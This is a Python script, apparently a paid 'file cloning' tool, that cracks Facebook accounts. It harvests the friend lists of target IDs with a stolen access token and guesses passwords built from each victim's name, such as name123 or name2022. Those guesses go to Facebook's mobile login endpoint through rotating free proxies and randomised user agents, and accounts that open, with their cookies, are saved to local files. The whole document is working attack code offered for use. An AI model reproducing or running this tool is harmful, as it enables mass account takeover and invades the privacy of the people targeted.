#MAKE BY ITZ JISAN 
#WATSHAP 0184649133

exec("""\n#-----------------[ IMPORT-MODULE ]-------------------\nfrom bs4 import BeautifulSoup as sop\nimport requests,bs4,json,os,sys,random,datetime,time,re\nimport urllib3,rich,base64\nfrom rich.table import Table as me\nfrom rich.console import Console as sol\nfrom bs4 import BeautifulSoup as sop\nfrom concurrent.futures import ThreadPoolExecutor as tred\nfrom rich.console import Group as gp\nfrom rich.panel import Panel as nel\nfrom rich import print as cetak\nfrom rich.markdown import Markdown as mark\nfrom rich.columns import Columns as col\nfrom rich import print as rprint\nfrom rich import pretty\nfrom rich.text import Text as tekz\nimport time\nfrom datetime import date\nfrom datetime import datetime\nfrom time import sleep\nfrom time import sleep as waktu\npretty.install()\nCON=sol()\n\nnow = datetime.now()\ndt_string = now.strftime("%H:%M")\ncurrent = datetime.now()\nta = current.year\nbu = current.month\nha = current.day\n\n#------------------[ USER-AGENT ]-------------------#\nugen2=[]\nugen=[]\ncokbrut=[]\nses=requests.Session()\nprincp=[]\ntry:\n	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text\n	open('.prox.txt','w').write(prox) \nexcept Exception as e:\n	print(' \\x1b[1;91m\\x1b[1;96m\\x1b[1;92m \\x1b[1;96m[HAMIM')\nprox=open('.prox.txt','r').read().splitlines()\nfor xd in range(10000):\n	a='Mozilla/5.0 (Symbian/3; Series60/'\n	b=random.randrange(1, 9)\n	c=random.randrange(1, 9)\n	d='Nokia'\n	e=random.randrange(100, 9999)\n	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'\n	g=random.randrange(1, 9)\n	h=random.randrange(1, 4)\n	i=random.randrange(1, 4)\n	j=random.randrange(1, 4)\n	k='Mobile Safari/535.1'\n	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')\n	ugen2.append(uaku)\n\n\n	aa='Mozilla/5.0 (Linux; U; Android'\n	b=random.choice(['6','7','8','9','10','11','12'])\n	c=' en-us; GT-'\n	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])\n	e=random.randrange(1, 999)\n	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])\n	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'\n	h=random.randrange(73,100)\n	i='0'\n	j=random.randrange(4200,4900)\n	k=random.randrange(40,150)\n	l='Mobile Safari/537.36'\n	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'\n	ugen.append(uaku2)\nfor x in range(10):\n	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'\n	b=random.randrange(100, 9999)\n	c=random.randrange(100, 9999)\n	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])\n	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])\n	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])\n	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])\n	h=random.randrange(1, 9)\n	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'\n	j=random.randrange(1, 9)\n	k=random.randrange(1, 9)\n	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'\n	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'\ndef uaku():\n	try:\n		ua=open('bbnew.txt','r').read().splitlines()\n		for ub in ua:\n			ugen.append(ub)\n	except:\n		a=requests.get('https://github.com/X1X4D-2-0/CONTROL/blob/main/CONTROL.txt').text\n		ua=open('.bbnew.txt','w')\n		aa=re.findall('line">(.*?)<',str(a))\n		for un in aa:\n			ua.write(un+'\\n')\n		ua=open('.bbnew.txt','r').read().splitlines()\n#------------[ INDICATION ]---------------#\nid,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]\ncokbrut=[]\npwpluss,pwnya=[],[]\n#------------[ WARNA-COLOR ]--------------#\nP = '\\x1b[1;97m'\nM = '\\x1b[1;91m'\nH = '\\x1b[1;92m'\nK = '\\x1b[1;93m'\nB = '\\x1b[1;94m'\nU = '\\x1b[1;95m' \nO = '\\x1b[1;96m'\nN = '\\x1b[0m'    \nZ = "\\033[1;30m"\nsir = '\\033[41m\\x1b[1;97m'\nx = '\\33[m' # DEFAULT\nm = '\\x1b[1;91m' #RED +\nk = '\\033[93m' # KUNING +\nh = '\\x1b[1;92m' # HIJAU +\nhh = '\\033[32m' # HIJAU -\nu = '\\033[95m' # UNGU\nkk = '\\033[33m' # KUNING -\nb = '\\33[1;96m' # BIRU -\np = '\\x1b[0;34m' # BIRU +\nasu = random.choice([m,k,h,u,b])\n#------------------[ MACHINE-SUPPORT ]---------------#\ndef clear():\n    os.system('clear')\n    banner()\nfrom time import localtime as lt\nfrom os import system as cmd\nltx = int(lt()[3])\nif ltx > 12:\n    a = ltx-12\n    tag = "\\x1b[1;91mPM"\nelse:\n    a = ltx\n    tag = "\\x1b[1;96mAM"\n\ndef _JISAN_(u):\n        for e in u + "\\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.002)\ndef clear():\n	os.system('clear')\ndef back():\n	login()\n#------------------[ LOGO-LAKNAT ]-----------------#\ndef banner():\n	print(f\"\"\"\n\\033[0;95m██ ████████ ███████          ██ ██ ███████  █████  ███    ██ \n\\033[0;95m██    ██       ███           ██ ██ ██      ██   ██ ████   ██ \n\\033[0;95m██    ██      ███            ██ ██ ███████ ███████ ██ ██  ██ \n\\033[0;93m██    ██     ███        ██   ██ ██      ██ ██   ██ ██  ██ ██ \n\\033[0;93m██    ██    ███████      █████  ██ ███████ ██   ██ ██   ████ \n\\x1b[1;92m┏─────────────────────────────────────────┓\n\\x1b[1;92m│\\x1b[1;97m [\\x1b[1;92m+\\x1b[1;97m]  \\x1b[1;92m AUTHOR     \\x1b[1;97m: \\x1b[1;92mHAMIM UDDIN JISAN      \n\\x1b[1;92m│\\x1b[1;97m [\\x1b[1;92m+\\x1b[1;97m]  \\x1b[1;92m FACEBOOK   \\x1b[1;97m: \\x1b[1;92mITZ JISAN XHOWDHURY                \n\\x1b[1;92m│\\x1b[1;97m [\\x1b[1;92m+\\x1b[1;97m]  \\x1b[1;92m WHATSAPP   \\x1b[1;97m: \\x1b[1;92m+8801814649133               \n\\x1b[1;92m│\\x1b[1;97m [\\x1b[1;92m+\\x1b[1;97m]  \\x1b[1;92m STATUS     \\x1b[1;97m: \\x1b[1;92mFILE CLONING  \n\\x1b[1;92m│\\x1b[1;97m [\\x1b[1;92m+\\x1b[1;97m]  \\x1b[1;92m GITHUB     \\x1b[1;97m: \\x1b[1;92mX1X4D-2-0         \n\\x1b[1;92m┗─────────────────────────────────────────┛\n \\x1b[1;92m\"\"\")\nos.system('clear')\nbanner()\nos.system("play-audio ASSALAMUALAIKUM_WELCOME_TO_ITZ_JISAN_WORLD.mp3")\nprint(f' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ \\033[47m\\033[1;31mWHAT IS YOUR NAME\\033[40m\\033[00m')\nJISAN_NAME=input(f' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ YOUR NAME ➣\\x1b[1;96m ')\n#--------------------[ BAGIAN-MASUK ]--------------#\ndef login():\n	try:\n		token = open('.token.txt','r').read()\n		cok = open('.cok.txt','r').read()\n		tokenku.append(token)\n		try:\n			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})\n			sy2 = json.loads(sy.text)['name']\n			sy3 = json.loads(sy.text)['id']\n			menu(sy2,sy3)\n		except KeyError:\n			login_lagi334()\n		except requests.exceptions.ConnectionError:\n			li = ' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ CHECK YOUR INTERNET THEN TRY AGAIN'\n			lo = mark(li, style='red')\n			sol().print(lo, style='purple')\n			exit()\n	except IOError:\n		login_lagi334()\ndef login_lagi334():\n	try:\n		os.system('clear')\n		banner()\n		asu = random.choice([m,k,h,b,u])\n		cookie=input(f' \\x1b[1;91m➣\\x1b[1;96m➣\\x1b[1;92m➣ [+] INPUT COOKIES :{asu} ')\n		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (iPhone13,3; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) \n		find_token = re.search("(EAAG\\w+)", data.text)\n		ken=open(".token.txt", "w").write(find_token.group(1))\n		cok=open(".cok.txt", "w").write(cookie)\n		print(f' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ LOGIN SUCCESSFUL \\n \\x1b[1;91m➣\\x1b[1;96m➣\\x1b[1;92m➣ TYPE \\x1b[1;96mpython HAMIM-M1.py');time.sleep(1)\n		exit()\n	except Exception as e:\n		os.system("rm -f .token.txt")\n		os.system("rm -f .cok.txt")\n		print(f' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ \\x1b[1;91mERROR BRO CHECK YOUR COOKIES ID')\n		exit()\n#------------------[ BAGIAN-MENU ]----------------#\ndef menu(my_name,my_id):\n	try:\n		token = open('.token.txt','r').read()\n		cok = open('.cok.txt','r').read()\n	except IOError:\n		print(' \\x1b[1;91m➣\\x1b[1;96m➣\\x1b[1;91m➣ Cookies Expired ')\n		time.sleep(5)\n		login_lagi334()\n	os.system('clear')\n	banner()\n	ip = requests.get("https://api.ipify.org").text\n	_JISAN_(f'\\x1b[1;91m┏────────────────────────┓')\n	_JISAN_(f'\\x1b[1;91m│\\033[47m\\033[1;30mPREMIUM USER INFORMATION\\033[40m\\033[00m\\x1b[1;91m│')\n	_JISAN_(f'\\x1b[1;91m┠─────────────┯──────────┛')\n	_JISAN_(f'\\x1b[1;91m│\\x1b[1;92mYOUR NAME\\x1b[1;91m────╂➣\\x1b[1;92m '+str(JISAN_NAME))\n	_JISAN_(f'\\x1b[1;91m│\\x1b[1;92mYOUR ID NAME\\x1b[1;91m─╂➣\\x1b[1;92m {my_name}')\n	_JISAN_(f'\\x1b[1;91m│\\x1b[1;92mCLONING DATE\\x1b[1;91m─╂➣ \\x1b[1;92m{ha}\\x1b[1;91m/\\x1b[1;92m{bu}\\x1b[1;91m/\\x1b[1;92m{ta}')\n	_JISAN_(f"\\x1b[1;91m│\\x1b[1;92mCLONING TIME\\x1b[1;91m─╂➣ \\x1b[1;92m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")\n	_JISAN_(f'\\x1b[1;91m│\\x1b[1;92mYOUR ID\\x1b[1;91m──────╂➣\\x1b[1;92m '+str(my_id))\n	_JISAN_(f'\\x1b[1;91m│\\x1b[1;92mYOUR IP\\x1b[1;91m──────╂➣ \\x1b[1;92m{ip}')\n	_JISAN_(f'\\x1b[1;91m┗─────────────┛')\n	_JISAN_(f'\\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ \\033[47m\\033[1;34m  CRACK METHOD  \\033[40m\\033[00m')\n	_JISAN_(f'\\x1b[1;91m[\\x1b[1;92m1\\x1b[1;91m]\\x1b[1;92m FILE CRACK')\n	_JISAN_(f'\\x1b[1;91m[\\x1b[1;92m2\\x1b[1;91m]\\x1b[1;92m CONTACT ME')\n	_JISAN_(f'\\x1b[1;91m[\\x1b[1;92m0\\x1b[1;91m]\\x1b[1;91m LOGOUT COOKIE & EXIT')\n	_____JISAN_____ = input('\\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ \\x1b[1;94mChoose ➣\\x1b[1;92m ')\n	if _____JISAN_____ in ['1']:\n		os.system("play-audio Firsr_Follow_My_GitHub.mp3")\n		F()\n	if _____JISAN_____ in ['2']:\n		os.system("play-audio Firsr_Follow_My_FACEBOOK_ID.mp3")\n		os.system("xdg-open https://www.facebook.com/TurRealabbu1")\n	if _____JISAN_____ in ['0']:\n		os.system('rm -rf .token.txt')\n		os.system('rm -rf .cookie.txt')\n		print(' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ LogOut Successful ')\n		exit()\n	else:\n		print(' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ Successful Bra 😄 ')\n		back()\ndef error():\n	print(f' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ \\x1b[1;91mSORRY, PLZ CHOOSE THE RIGHT MENU')\n	time.sleep(2)\n	back()\n	\ndef P():\n	try:\n		token = open('.token.txt','r').read()\n		cok = open('.cok.txt','r').read()\n	except IOError:\n		exit()\n	try:\n		os.system('clear')\n		banner()\n		jum = int(input(' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ Target Id Limit ➣ \\x1b[1;92m'))\n	except ValueError:\n		print(' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ \\x1b[1;91mWRONG TYPE ')\n		exit()\n	if jum<1 or jum>100:\n		print(' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ \\x1b[1;91mWrong Type  ')\n		exit()\n	ses=requests.Session()\n	yz = 0\n	for met in range(jum):\n		yz+=1\n		kl = input(h+' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ ENTER PUBLIC ID \\x1b[1;91m[\\x1b[1;92m'+str(yz)+'\\x1b[1;91m] \\x1b[1;92m➣ \\x1b[1;96m')\n		uid.append(kl)\n	for userr in uid:\n		try:\n			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()\n			for mi in col['friends']['data']:\n				try:\n					iso = (mi['id']+'|'+mi['name'])\n					if iso in id:pass\n					else:id.append(iso)\n				except:continue\n		except (KeyError,IOError):\n			pass\n		except requests.exceptions.ConnectionError:\n			print(' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ \\x1b[1;91m CHECK YOUR INTERNET CONNECTION BRUH')\n			exit()\n	try:\n		print(f' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ TOTAL ID ➣ \\x1b[1;96m'+str(len(id)))\n		Settings()\n	except requests.exceptions.ConnectionError:\n		print(f'{u}')\n		print(' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ \\x1b[1;91m CHECK YOUR INTERNET CONNECTION BRUH')\n		back()\n	except (KeyError,IOError):\n		print(f' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ \\x1b[1;91m Your Id Maybe Not Public\\n \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ Check Your Id\\n \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ \\x1b[1;91mThen Try Again')\n		time.sleep(3)\n		back()\n\n#-------------[ CRACK-FROM-FILE ]------------------#\ndef F():\n    os.system('clear');\n    D().plerr()\n    \n\nclass D:\n	def __init__(self):\n		self.id = []\n	def plerr(self):\n		os.system("clear")\n		banner()\n		try:\n			print(f' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ \\033[47m\\033[1;34m     Example: /sdcard/JISAN.txt     \\033[40m\\033[00m')\n			fileX = input (' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ ENTER YOUR FILE ➣\\x1b[1;93m ') \n			for line in open(fileX, 'r').readlines():\n				id.append(line.strip())\n			print(f' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ \\x1b[1;92mTOTAL ID ➣ \\x1b[1;92m'+str(len(id)))\n			Settings()\n		except IOError:\n			print(" \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ \\x1b[1;91m FILE %s NOT FOUND\\x1b[0m"%(fileX));time.sleep(2)\n			F()\n#-------------[ PENGATURAN-IDZ ]---------------#\ndef Settings():\n	print(f' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ \\x1b[1;91m[\\x1b[1;92m1\\x1b[1;91m]\\x1b[1;92m CLONE ONLY MIX ID')\n	hu = input(' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ \\x1b[1;94mCHOOSE ➣\\x1b[1;92m ')\n	if hu in ['0','00']:\n		muda=[]\n		for bacot in sorted(id):\n			muda.append(bacot)\n		bcm=len(muda)\n		bcmi=(bcm-1)\n		for xmud in range(bcm):\n			id2.append(muda[bcmi])\n			bcmi -=1\n	elif hu in ['1','01']:\n		for bacot in id:\n			xx = random.randint(0,len(id2))\n			id2.insert(xx,bacot)\n	else:\n		print(' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ \\x1b[1;91mWRONG OPTION BARA')\n		exit()\n	\n	print(f' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ \\x1b[1;91m[\\x1b[1;92m1\\x1b[1;91m]\\x1b[1;92m MOBILE ')\n	hc = input(' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ \\x1b[1;94mCHOOSE ➣\\x1b[1;92m ')\n	if hc in ['1','01']:\n		method.append('mobile')\n	else:\n		method.append('mobile')\n	pwplus=input(' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ \\033[47m\\033[1;35m     PASSWORD MENU     \\033[40m\\033[00m\\n \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ MANUAL PASSWORD \\x1b[1;91m[m]\\n \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ AUTO PASSWORD \\x1b[1;96m[d] \\x1b[1;92m\\n \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ \\x1b[1;94mChoose ➣ \\x1b[1;92m')\n	if pwplus in ['y','Y']:\n		pwpluss.append('ya')\n		print(f'Add Password Manual Minimam 6 Character')\n		pwku=input(' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ Add Password Manual : ')\n		pwkuh=pwku.split(',')\n		for xpw in pwkuh:\n			pwnya.append(xpw)\n	else:\n		pwpluss.append('no')\n	passwrd()\n	exit() \n#-------------------[ BAGIAN-WORDLIST ]------------#\ndef passwrd():\n	print(f'\\x1b[1;91m●\\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\\x1b[1;91m❴\\033[47m\\033[1;30mHAMIM\\033[40m\\033[00m\\x1b[1;91m❵\\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\\x1b[1;91m●')\n	print(f"\\x1b[1;91m [😍] \\x1b[1;92mYOUR NAME         \\x1b[1;91m➢ \\x1b[1;92m"+str(JISAN_NAME))\n	print(f"\\x1b[1;91m [🚀] \\x1b[1;92mTOTAL ID          \\x1b[1;91m➢ \\x1b[1;92m"+str(len(id)))\n	print(f"\\x1b[1;91m [💉] \\x1b[1;92mTODAY TIME        \\x1b[1;91m➢ \\x1b[1;92m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")\n	print(f"\\x1b[1;91m [💉] \\x1b[1;92mTODAY DATE        \\x1b[1;91m➢ \\x1b[1;92m{ha}\\x1b[1;91m/\\x1b[1;92m{bu}\\x1b[1;91m/\\x1b[1;92m{ta} ")\n	print(f"\\x1b[1;91m [😩] \\x1b[1;91mNOTE ➢ \\33[1;92m[ USE AIRPLANE MODE BEFORE USE ] ")\n	print(f'\\x1b[1;91m●\\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\\x1b[1;91m❴\\033[47m\\033[1;30mHAMIM\\033[40m\\033[00m\\x1b[1;91m❵\\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\\x1b[1;91m●\\n')\n	with tred(max_workers=30) as pool:\n		for yuzong in id2:\n			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()\n			frs = nmf.split(' ')[0]\n			pwv = []\n			if len(nmf)<6:\n				if len(frs)<3:\n					pass\n				else:\n					pwv.append(frs+'123')\n					pwv.append(frs+'1234')\n					pwv.append(frs+'12345')\n					pwv.append(frs+'123456')\n					pwv.append(frs+'2020')\n					pwv.append(frs+'2021')\n					pwv.append(frs+'2022')\n			else:\n				if len(frs)<3:\n					pwv.append(nmf)\n				else:\n					pwv.append(nmf)\n					pwv.append(nmf+'@@')\n					pwv.append(frs+'123')\n					pwv.append(frs+'1234')\n					pwv.append(frs+'12345')\n					pwv.append(frs+'123456')\n					pwv.append(frs+'2020')\n					pwv.append(frs+'2021')\n					pwv.append(frs+'2022')\n			if 'ya' in pwpluss:\n				for xpwd in pwnya:\n					pwv.append(xpwd)\n			else:pass\n			if 'mobile' in method:\n				pool.submit(crack,idf,pwv)\n			elif 'free' in method:\n				pool.submit(crackfree,idf,pwv)\n			elif 'touch' in method:\n				pool.submit(cracktouch,idf,pwv)\n	print(f' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ CRACK COMPLETE ')\n	print(f' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ OK : {h}%s '%(ok))\n	print(' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣  Main Manu \\x1b[1;92m[Y]\\n \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ \\x1b[1;91mExit [T]')\n	woi = input(' \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ Choose : ')\n	if woi in ['y','Y']:\n		back()\n	else:\n		print(f'\\t \\x1b[1;91m➢\\x1b[1;96m➣\\x1b[1;92m➣ Allah Hafiz Bro {u} ')\n		time.sleep(2)\n		exit()\n#--------------------[ METODE-B-API ]-----------------#\ndef crack(idf,pwv):\n	global loop,ok,cp\n	bo = random.choice([m,k,h,b,u,x])\n	sys.stdout.write(f"\\r{bo} [HAMIM] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{'{:.0%}'.format(loop/float(len(id)))}]  "),\n	sys.stdout.flush()\n	ua = random.choice(ugen)\n	ua2 = random.choice(ugen2)\n	ses = requests.Session()\n	for pw in pwv:\n		try:\n			nip=random.choice(prox)\n			proxs= {'http': 'socks4://'+nip}\n			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})\n			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')\n			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}\n			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])\n			koki+=' m_pixel_ratio=2.625; wd=412x756'\n			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}\n			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)\n			if "checkpoint" in po.cookies.get_dict().keys():\n				print(f'\\r \\x1b[1;93m[HAMIM-CP] {idf} | {pw}{N}')     \n				open('CP/'+cpc,'a').write(idf+'|'+pw+'\\n')\n				akun.append(idf+'|'+pw)\n				cp+=1\n				break\n			elif "c_user" in ses.cookies.get_dict().keys():\n				ok+=1\n				coki=po.cookies.get_dict()\n				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])\n				print(f'\\r{H}\\n [HAMIM-OK] [💚] {idf} | {pw}\\n [💉]COOKIES ➢ {kuki}{N}')\n				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\\n')\n				break\n				\n			else:\n				continue\n		except requests.exceptions.ConnectionError:\n			time.sleep(31)\n	loop+=1\n\ndef RHAMIM():\n  os.system('clear')\n  banner()\n  uuid = str(os.geteuid()) + str(os.getlogin())\n  id = "≠".join(uuid)\n  try:\n    httpCaht = requests.get('https://github.com/X1X4D-2-0/CONTROL/blob/main/CONTROL.txt').text\n    if id in httpCaht:\n      msg = str(os.geteuid())\n      time.sleep(0.3)\n      login()\n      pass\n    else:\n      print('\\033[1;36m┏─────────────────────────────────────────┓')\n      print('\\x1b[1;97m [\\x1b[1;92m+\\x1b[1;97m] \\033[1;32mThis Is Paid Tools Enjoy 💚')\n      print("\\x1b[1;97m [\\x1b[1;92m+\\x1b[1;97m] \\033[1;38mYOUR KEY :\\033[1;32m HAMIM="+id)\n      print('\\033[1;36m┗─────────────────────────────────────────┛')\n      os.system('xdg-open https://wa.me/+8801814649133')\n      time.sleep(3)\n      sys.exit()\n  except:\n      sys.exit()\n#-----------------------[ SYSTEM-CONTROL ]--------------------#\nif __name__=='__main__':\n    try:os.system('git pull')\n    except:pass\n    try:os.mkdir('OK')\n    except:pass\n    try:os.mkdir('CP')\n    except:pass\n    try:os.mkdir('DUMP')\n    except:pass\n    try:os.system('touch .prox.txt')\n    except:pass\n    RHAMIM()\n""")